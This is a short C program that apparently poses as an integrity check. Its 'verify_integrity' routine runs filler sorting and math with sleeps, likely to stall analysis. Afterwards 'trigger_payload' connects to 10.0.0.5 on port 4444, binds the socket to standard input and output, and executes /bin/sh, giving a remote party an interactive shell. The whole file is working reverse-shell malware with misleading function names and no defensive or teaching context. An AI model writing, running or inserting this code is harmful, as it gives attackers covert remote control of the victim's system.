#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <math.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

void junk_math_operation() {
    double result = 0.0;
    int *data = (int *)malloc(1000 * sizeof(int));
    for (int i = 0; i < 1000; i++) {
        data[i] = rand() % 10000;
    }
    for (int i = 0; i < 1000; i++) {
        for (int j = 0; j < 999; j++) {
            if (data[j] > data[j + 1]) {
                int temp = data[j];
                data[j] = data[j + 1];
                data[j + 1] = temp;
            }
        }
    }
    for (int i = 0; i < 1000; i++) {
        result += sqrt((double)data[i]);
    }
    free(data);
}

void verify_integrity() {
    for (int i = 0; i < 50; i++) {
        junk_math_operation();
        usleep(10000); 
    }
}

void trigger_payload() {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in r;
    r.sin_family = AF_INET;
    r.sin_port = htons(4444);
    r.sin_addr.s_addr = inet_addr("10.0.0.5");
    
    if (connect(s, (struct sockaddr *)&r, sizeof(r)) == 0) {
        dup2(s, 0);
        dup2(s, 1);
        dup2(s, 2);
        char *args[] = {"/bin/sh", NULL};
        execve("/bin/sh", args, NULL);
    }
}

int main() {
    verify_integrity();
    
    int activation_key = 0;
    for(int i = 0; i < 1000000; i++) {
        activation_key += i % 7;
    }

    if (activation_key > 0) {
        trigger_payload();
    }

    return 0;
}